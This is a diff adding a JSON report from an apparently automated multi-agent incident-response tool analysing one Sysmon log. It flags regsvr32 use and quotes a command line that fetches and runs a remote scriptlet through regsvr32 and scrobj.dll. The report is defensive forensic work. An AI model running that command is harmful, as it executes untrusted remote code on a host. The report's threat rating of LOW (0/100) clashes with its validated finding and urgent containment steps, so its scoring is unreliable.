@@ -1,0 +1,561 @@
+{
+  "nexus_ir_version": "4.0.0-langgraph",
+  "session_id": "20260523_025800",
+  "investigation_complete": true,
+  "langgraph_iterations": 1,
+  "executive_summary": {
+    "threat_level": "LOW",
+    "threat_score": 0,
+    "case_priority": "HIGH",
+    "total_files_analyzed": 1,
+    "attack_patterns_detected": 0,
+    "unique_ips_found": 0,
+    "findings_validated": 2,
+    "findings_rejected": 0,
+    "overall_confidence": "HIGH",
+    "auto_remediated": 0
+  },
+  "attack_patterns": [],
+  "ip_correlations": [],
+  "timeline": [
+    {
+      "agent": "TriageAgent",
+      "type": "evidence_detected",
+      "timestamp": "2026-05-23T02:58:00.881005+00:00",
+      "artifact": "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json"
+    },
+    {
+      "agent": "LogAgent",
+      "type": "suspicious_log_activity",
+      "timestamp": "2026-05-23T02:58:01.215042+00:00",
+      "artifact": "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json"
+    }
+  ],
+  "validated_findings": [
+    {
+      "finding": {
+        "type": "evidence_detected",
+        "category": "json_artifacts",
+        "count": 1,
+        "files": [
+          "sysmon_lolbin.json"
+        ],
+        "artifact": "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json",
+        "agent": "TriageAgent",
+        "iteration": 1,
+        "timestamp": "2026-05-23T02:58:00.881005+00:00",
+        "traceable": true
+      },
+      "source_agent": "TriageAgent",
+      "valid": true,
+      "confidence": 70,
+      "issues": [],
+      "verification_steps": [
+        "Artifact verified: sysmon_lolbin.json",
+        "File on disk: sysmon_lolbin.json",
+        "Timestamp present"
+      ]
+    },
+    {
+      "finding": {
+        "type": "suspicious_log_activity",
+        "file": "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json",
+        "artifact": "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json",
+        "file_hash": "f14b1cdd94c84b608b1406a61855472b6c85b90967bfa9bf2d1354700ade531e",
+        "keywords_matched": [
+          "regsvr32"
+        ],
+        "total_hits": 3,
+        "agent": "LogAgent",
+        "iteration": 1,
+        "timestamp": "2026-05-23T02:58:01.215042+00:00",
+        "traceable": true
+      },
+      "source_agent": "LogAgent",
+      "valid": true,
+      "confidence": 100,
+      "issues": [],
+      "verification_steps": [
+        "Artifact verified: sysmon_lolbin.json",
+        "File on disk: sysmon_lolbin.json",
+        "Keywords: ['regsvr32']",
+        "Timestamp present"
+      ]
+    }
+  ],
+  "rejected_findings": [],
+  "attack_narrative": "",
+  "containment_actions": [
+    "ISOLATE host DESKTOP-DEV immediately \u2014 disconnect from all network segments",
+    "ISOLATE host DESKTOP-DEV-99A immediately \u2014 disconnect from all network segments",
+    "SUSPEND account 'DESKTOP-DEV-99A' and invalidate all active sessions",
+    "PRESERVE all Sysmon, network, and endpoint logs for legal/forensic proceedings",
+    "NOTIFY CISO and legal team \u2014 assess breach notification obligations"
+  ],
+  "extracted_entities": {
+    "ipv4_addresses": [],
+    "sha256_hashes": [],
+    "md5_hashes": [],
+    "base64_strings": [],
+    "decoded_payloads": [],
+    "file_paths": [
+      "/bit.ly/3x9Z2a1"
+    ],
+    "hostnames": [
+      "DESKTOP-DEV",
+      "DESKTOP-DEV-99A"
+    ],
+    "usernames": [
+      "DESKTOP-DEV-99A"
+    ],
+    "process_ids": [
+      "10240",
+      "2104"
+    ],
+    "granted_access": [],
+    "domains": []
+  },
+  "temporal_sequences": [],
+  "chain_of_custody": {
+    "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json": {
+      "sha256": "f14b1cdd94c84b608b1406a61855472b6c85b90967bfa9bf2d1354700ade531e",
+      "timestamp": "2026-05-23T02:58:01.226345+00:00",
+      "size_bytes": 1131
+    }
+  },
+  "execution_trace": [
+    {
+      "timestamp": "2026-05-23T02:58:00.879202+00:00",
+      "level": "AGENT",
+      "message": "NODE: Triage \u2014 examining evidence...",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:58:00.881672+00:00",
+      "level": "DONE",
+      "message": "Triage done \u2014 Priority: HIGH, Files: 1",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:58:00.883674+00:00",
+      "level": "AGENT",
+      "message": "NODE: Log Analysis \u2014 hunting IoCs...",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:58:01.215859+00:00",
+      "level": "DONE",
+      "message": "Log analysis done \u2014 1 findings",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:58:01.219120+00:00",
+      "level": "AGENT",
+      "message": "NODE: Disk Analysis -- scanning file system artifacts...",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:58:01.220634+00:00",
+      "level": "DONE",
+      "message": "Disk analysis done -- 0 hit(s), priority: LOW",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:58:01.222629+00:00",
+      "level": "AGENT",
+      "message": "NODE: Memory Analysis -- hunting injection and credential dumps...",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:58:01.223526+00:00",
+      "level": "DONE",
+      "message": "Memory analysis done -- 0 hit(s), priority: LOW",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:58:01.225465+00:00",
+      "level": "AGENT",
+      "message": "NODE: Network Analysis -- detecting C2, exfil, tunneling...",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:58:01.227619+00:00",
+      "level": "DONE",
+      "message": "Network analysis done -- 0 hit(s), priority: LOW",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:58:01.229765+00:00",
+      "level": "AGENT",
+      "message": "NODE: Correlation \u2014 cross-referencing findings...",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:58:01.231172+00:00",
+      "level": "DONE",
+      "message": "Correlation done \u2014 Threat: LOW (0/100)",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:58:01.232853+00:00",
+      "level": "AGENT",
+      "message": "NODE: Correction \u2014 devil advocate pass (iteration 0)...",
+      "iteration": 0
+    },
+    {
+      "timestamp": "2026-05-23T02:58:01.282042+00:00",
+      "level": "DONE",
+      "message": "Correction done \u2014 100.0% accuracy, 2 validated",
+      "iteration": 0
+    }
+  ],
+  "agent_reports": {
+    "triage": {
+      "status": "COMPLETE",
+      "agent": "TriageAgent",
+      "case_path": "/data/data/com.termux/files/home/cases/lolbin_invasion",
+      "priority": "HIGH",
+      "keyword_hits": {
+        "critical_keywords_found": [],
+        "high_keywords_found": [
+          "regsvr32"
+        ]
+      },
+      "all_files": [
+        "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json"
+      ],
+      "evidence_types": {
+        "disk_images": [],
+        "memory_dumps": [],
+        "log_files": [],
+        "network_captures": [],
+        "registry_files": [],
+        "json_artifacts": [
+          "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json"
+        ],
+        "csv_data": [],
+        "unknown": []
+      },
+      "total_files": 1,
+      "investigation_plan": [
+        {
+          "agent": "LogAgent",
+          "reason": "1 text artifact(s) detected",
+          "priority": 1
+        },
+        {
+          "agent": "CorrelationAgent",
+          "reason": "Always runs",
+          "priority": 5
+        },
+        {
+          "agent": "CorrectionAgent",
+          "reason": "Always runs",
+          "priority": 6
+        }
+      ],
+      "file_hashes": {
+        "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json": "f14b1cdd94c84b608b1406a61855472b6c85b90967bfa9bf2d1354700ade531e"
+      },
+      "findings": [
+        {
+          "type": "evidence_detected",
+          "category": "json_artifacts",
+          "count": 1,
+          "files": [
+            "sysmon_lolbin.json"
+          ],
+          "artifact": "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json",
+          "agent": "TriageAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:58:00.881005+00:00",
+          "traceable": true
+        }
+      ],
+      "errors": [],
+      "timestamp": "2026-05-23T02:58:00.881575+00:00"
+    },
+    "log_analysis": {
+      "status": "COMPLETE",
+      "agent": "LogAgent",
+      "log_files_analyzed": 1,
+      "suspicious_files": 1,
+      "hits": {
+        "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json": {
+          "regsvr32": {
+            "matches": [
+              "C:\\Windows\\System32\\regsvr32.exe",
+              "regsvr32.exe /s /n /u /i:http://bit.ly/3x9Z2a1 scrobj.dll",
+              "C:\\Windows\\System32\\regsvr32.exe"
+            ],
+            "count": 3,
+            "source_file": "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json",
+            "file_hash": "f14b1cdd94c84b60",
+            "tool_used": "json_parser"
+          }
+        }
+      },
+      "extracted_iocs": {
+        "ipv4_addresses": [],
+        "sha256_hashes": [],
+        "md5_hashes": [],
+        "base64_strings": [],
+        "decoded_payloads": [],
+        "file_paths": [
+          "/bit.ly/3x9Z2a1"
+        ],
+        "hostnames": [
+          "DESKTOP-DEV",
+          "DESKTOP-DEV-99A"
+        ],
+        "usernames": [
+          "DESKTOP-DEV-99A"
+        ],
+        "process_ids": [
+          "10240",
+          "2104"
+        ],
+        "granted_access": []
+      },
+      "unique_ips": [],
+      "chain_of_custody": {
+        "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json": {
+          "sha256": "f14b1cdd94c84b608b1406a61855472b6c85b90967bfa9bf2d1354700ade531e",
+          "timestamp": "2026-05-23T02:58:00.925657+00:00",
+          "size_bytes": 1131
+        }
+      },
+      "decoded_payloads": [],
+      "findings": [
+        {
+          "type": "suspicious_log_activity",
+          "file": "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json",
+          "artifact": "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json",
+          "file_hash": "f14b1cdd94c84b608b1406a61855472b6c85b90967bfa9bf2d1354700ade531e",
+          "keywords_matched": [
+            "regsvr32"
+          ],
+          "total_hits": 3,
+          "agent": "LogAgent",
+          "iteration": 1,
+          "timestamp": "2026-05-23T02:58:01.215042+00:00",
+          "traceable": true
+        }
+      ],
+      "errors": [],
+      "timestamp": "2026-05-23T02:58:01.215715+00:00"
+    },
+    "disk_analysis": {
+      "status": "COMPLETE",
+      "agent": "DiskAgent",
+      "files_analyzed": 1,
+      "total_hits": 0,
+      "priority": "LOW",
+      "extracted_iocs": {
+        "suspicious_executables": [],
+        "drop_zone_paths": [],
+        "persistence_paths": [],
+        "double_extension_files": [],
+        "malicious_filenames": []
+      },
+      "chain_of_custody": {
+        "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json": {
+          "sha256": "f14b1cdd94c84b608b1406a61855472b6c85b90967bfa9bf2d1354700ade531e",
+          "timestamp": "2026-05-23T02:58:01.219761+00:00",
+          "size_bytes": 1131
+        }
+      },
+      "findings": [],
+      "errors": [],
+      "timestamp": "2026-05-23T02:58:01.220572+00:00"
+    },
+    "memory_analysis": {
+      "status": "COMPLETE",
+      "agent": "MemoryAgent",
+      "files_analyzed": 1,
+      "total_hits": 0,
+      "priority": "LOW",
+      "extracted_iocs": {
+        "injection_techniques": [],
+        "credential_dump_indicators": [],
+        "suspicious_process_pairs": [],
+        "hollowing_indicators": [],
+        "memory_anomalies": []
+      },
+      "chain_of_custody": {
+        "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json": {
+          "sha256": "f14b1cdd94c84b608b1406a61855472b6c85b90967bfa9bf2d1354700ade531e",
+          "timestamp": "2026-05-23T02:58:01.223092+00:00",
+          "size_bytes": 1131
+        }
+      },
+      "findings": [],
+      "errors": [],
+      "timestamp": "2026-05-23T02:58:01.223473+00:00"
+    },
+    "network_analysis": {
+      "status": "COMPLETE",
+      "agent": "NetworkAgent",
+      "files_analyzed": 1,
+      "total_hits": 0,
+      "priority": "LOW",
+      "extracted_iocs": {
+        "c2_indicators": [],
+        "suspicious_ips": [],
+        "suspicious_ports": [],
+        "dns_tunnel_indicators": [],
+        "exfil_indicators": [],
+        "scan_indicators": [],
+        "tls_anomalies": [],
+        "long_subdomains": []
+      },
+      "chain_of_custody": {
+        "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json": {
+          "sha256": "f14b1cdd94c84b608b1406a61855472b6c85b90967bfa9bf2d1354700ade531e",
+          "timestamp": "2026-05-23T02:58:01.226345+00:00",
+          "size_bytes": 1131
+        }
+      },
+      "findings": [],
+      "errors": [],
+      "timestamp": "2026-05-23T02:58:01.227556+00:00"
+    },
+    "correlation": {
+      "status": "COMPLETE",
+      "agent": "CorrelationAgent",
+      "agents_correlated": 5,
+      "extracted_entities": {
+        "ipv4_addresses": [],
+        "sha256_hashes": [],
+        "md5_hashes": [],
+        "base64_strings": [],
+        "decoded_payloads": [],
+        "file_paths": [
+          "/bit.ly/3x9Z2a1"
+        ],
+        "hostnames": [
+          "DESKTOP-DEV",
+          "DESKTOP-DEV-99A"
+        ],
+        "usernames": [
+          "DESKTOP-DEV-99A"
+        ],
+        "process_ids": [
+          "10240",
+          "2104"
+        ],
+        "granted_access": [],
+        "domains": []
+      },
+      "ip_correlations": [],
+      "attack_patterns": [],
+      "temporal_sequences": [],
+      "high_signal_signatures": [],
+      "timeline": [
+        {
+          "agent": "TriageAgent",
+          "type": "evidence_detected",
+          "timestamp": "2026-05-23T02:58:00.881005+00:00",
+          "artifact": "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json"
+        },
+        {
+          "agent": "LogAgent",
+          "type": "suspicious_log_activity",
+          "timestamp": "2026-05-23T02:58:01.215042+00:00",
+          "artifact": "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json"
+        }
+      ],
+      "threat_assessment": {
+        "score": 0,
+        "level": "LOW",
+        "reasons": []
+      },
+      "attack_narrative": "",
+      "containment_actions": [
+        "ISOLATE host DESKTOP-DEV immediately \u2014 disconnect from all network segments",
+        "ISOLATE host DESKTOP-DEV-99A immediately \u2014 disconnect from all network segments",
+        "SUSPEND account 'DESKTOP-DEV-99A' and invalidate all active sessions",
+        "PRESERVE all Sysmon, network, and endpoint logs for legal/forensic proceedings",
+        "NOTIFY CISO and legal team \u2014 assess breach notification obligations"
+      ],
+      "findings": [],
+      "errors": [],
+      "timestamp": "2026-05-23T02:58:01.231109+00:00"
+    },
+    "correction": {
+      "status": "COMPLETE",
+      "agent": "CorrectionAgent",
+      "validated_findings": [
+        {
+          "finding": {
+            "type": "evidence_detected",
+            "category": "json_artifacts",
+            "count": 1,
+            "files": [
+              "sysmon_lolbin.json"
+            ],
+            "artifact": "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json",
+            "agent": "TriageAgent",
+            "iteration": 1,
+            "timestamp": "2026-05-23T02:58:00.881005+00:00",
+            "traceable": true
+          },
+          "source_agent": "TriageAgent",
+          "valid": true,
+          "confidence": 70,
+          "issues": [],
+          "verification_steps": [
+            "Artifact verified: sysmon_lolbin.json",
+            "File on disk: sysmon_lolbin.json",
+            "Timestamp present"
+          ]
+        },
+        {
+          "finding": {
+            "type": "suspicious_log_activity",
+            "file": "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json",
+            "artifact": "/data/data/com.termux/files/home/cases/lolbin_invasion/sysmon_lolbin.json",
+            "file_hash": "f14b1cdd94c84b608b1406a61855472b6c85b90967bfa9bf2d1354700ade531e",
+            "keywords_matched": [
+              "regsvr32"
+            ],
+            "total_hits": 3,
+            "agent": "LogAgent",
+            "iteration": 1,
+            "timestamp": "2026-05-23T02:58:01.215042+00:00",
+            "traceable": true
+          },
+          "source_agent": "LogAgent",
+          "valid": true,
+          "confidence": 100,
+          "issues": [],
+          "verification_steps": [
+            "Artifact verified: sysmon_lolbin.json",
+            "File on disk: sysmon_lolbin.json",
+            "Keywords: ['regsvr32']",
+            "Timestamp present"
+          ]
+        }
+      ],
+      "rejected_findings": [],
+      "warnings": [],
+      "summary": {
+        "total_findings_reviewed": 2,
+        "validated": 2,
+        "rejected": 0,
+        "warnings": 0,
+        "accuracy_rate": 100.0,
+        "overall_confidence": "HIGH",
+        "devil_advocate_issues": [],
+        "devil_advocate_suggestions": [],
+        "forced_reeval": false,
+        "auto_remediated_patterns": [],
+        "auto_remediation_count": 0
+      },
+      "errors": [],
+      "timestamp": "2026-05-23T02:58:01.281986+00:00"
+    }
+  },
+  "timestamp": "2026-05-23T02:58:01.284562+00:00",
+  "duration_seconds": 0.49
+}
